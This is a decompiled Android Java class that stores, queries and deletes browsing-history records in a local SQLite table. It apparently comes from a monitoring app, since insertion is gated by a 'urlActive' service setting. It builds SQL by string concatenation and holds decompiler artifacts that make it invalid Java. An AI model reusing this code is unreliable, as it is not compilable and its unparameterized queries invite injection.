package com.app.system.common.h;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.app.system.common.entity.URLHistory;
import com.security.ServiceSettings;
import com.security.d.a;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class n
  extends b
{
  public n(Context paramContext)
  {
    super(paramContext);
  }
  
  public int a(List<URLHistory> paramList)
  {
    int i = 0;
    if (paramList != null) {
      try
      {
        if (paramList.size() == 0) {
          return -2;
        }
        b();
        Object localObject = "delete from  url_history WHERE 1=0 ";
        Iterator localIterator = paramList.iterator();
        StringBuilder localStringBuilder;
        for (paramList = (List<URLHistory>)localObject; localIterator.hasNext(); paramList = localStringBuilder.toString())
        {
          localObject = (URLHistory)localIterator.next();
          localStringBuilder = new java/lang/StringBuilder;
          localStringBuilder.<init>();
          localStringBuilder.append(paramList);
          localStringBuilder.append(" or rowId = ");
          localStringBuilder.append(((URLHistory)localObject).c());
        }
        this.a.execSQL(paramList);
        a();
      }
      catch (Exception paramList)
      {
        a.d("TUrl", paramList.getMessage(), new Object[0]);
      }
    }
    i = -1;
    return i;
  }
  
  public URLHistory a(Cursor paramCursor)
  {
    URLHistory localURLHistory = new URLHistory();
    localURLHistory.b(paramCursor.getLong(0));
    localURLHistory.a(paramCursor.getString(1));
    localURLHistory.b(paramCursor.getString(2));
    localURLHistory.c(paramCursor.getLong(3));
    localURLHistory.a(paramCursor.getLong(4));
    return localURLHistory;
  }
  
  public List<URLHistory> a(Date paramDate1, Date paramDate2, int paramInt)
  {
    ArrayList localArrayList = new ArrayList();
    Date localDate1 = paramDate1;
    Date localDate2;
    if (paramDate1 == null) {
      try
      {
        localDate1 = new java/util/Date;
        Date localDate3 = new java/util/Date;
        localDate3.<init>();
        localDate1.<init>(localDate3.getTime() - 604800000L);
      }
      catch (Exception localException)
      {
        a.a("TUrl", localException.getMessage(), new Object[0]);
        localDate2 = paramDate1;
      }
    }
    paramDate1 = paramDate2;
    if (paramDate2 == null) {
      paramDate1 = new Date();
    }
    long l = paramDate1.getTime() / 1000L;
    paramDate1 = new StringBuilder();
    paramDate1.append("select rowid, address,title, visit_count, last_visited_date from url_history where last_visited_date > ");
    paramDate1.append(localDate2.getTime() / 1000L);
    paramDate1.append(" and last_visited_date <= ");
    paramDate1.append(l);
    paramDate1 = paramDate1.toString();
    if (paramInt == 0)
    {
      paramDate2 = new StringBuilder();
      paramDate2.append(paramDate1);
      paramDate2.append(" order by last_visited_date desc");
      paramDate1 = paramDate2.toString();
    }
    else
    {
      paramDate2 = new StringBuilder();
      paramDate2.append(paramDate1);
      paramDate2.append(" order by last_visited_date desc limit ");
      paramDate2.append(paramInt);
      paramDate1 = paramDate2.toString();
    }
    b();
    paramDate1 = this.a.rawQuery(paramDate1, null);
    paramDate2 = new StringBuilder();
    paramDate2.append("URL : Get ");
    paramDate2.append(paramInt);
    paramDate2.append(" / ");
    paramDate2.append(paramDate1.getCount());
    paramDate2.append(" RECORDS.");
    a.d("TUrl", paramDate2.toString(), new Object[0]);
    if (paramDate1.moveToFirst()) {
      do
      {
        localArrayList.add(a(paramDate1));
      } while (paramDate1.moveToNext());
    }
    paramDate1.close();
    a();
    return localArrayList;
  }
  
  public boolean a(URLHistory paramURLHistory)
  {
    if (ServiceSettings.a().urlActive) {
      try
      {
        b();
        String str1 = b.a(paramURLHistory.a());
        String str2 = b.a(paramURLHistory.d());
        SQLiteDatabase localSQLiteDatabase = this.a;
        StringBuilder localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        localStringBuilder.append("insert into url_history  (address,  title, visit_count, last_visited_date) select '");
        localStringBuilder.append(str1);
        localStringBuilder.append("', '");
        localStringBuilder.append(str2);
        localStringBuilder.append("', ");
        localStringBuilder.append(String.valueOf(paramURLHistory.e()));
        localStringBuilder.append(", ");
        localStringBuilder.append(String.valueOf(paramURLHistory.b()));
        localStringBuilder.append(" where not exists (select 1 from url_history where address='");
        localStringBuilder.append(str1);
        localStringBuilder.append("' and title = '");
        localStringBuilder.append(str2);
        localStringBuilder.append("' and visit_count = ");
        localStringBuilder.append(String.valueOf(paramURLHistory.e()));
        localStringBuilder.append(" and last_visited_date = ");
        localStringBuilder.append(String.valueOf(paramURLHistory.b()));
        localStringBuilder.append(")");
        localSQLiteDatabase.execSQL(localStringBuilder.toString());
        a();
        return true;
      }
      catch (Exception paramURLHistory)
      {
        a.d("TUrl", paramURLHistory.getMessage(), new Object[0]);
        return false;
      }
    }
    return true;
  }
}


/* Location:              ~/com/app/system/common/h/n.class
 *
 * Reversed by:           J
 */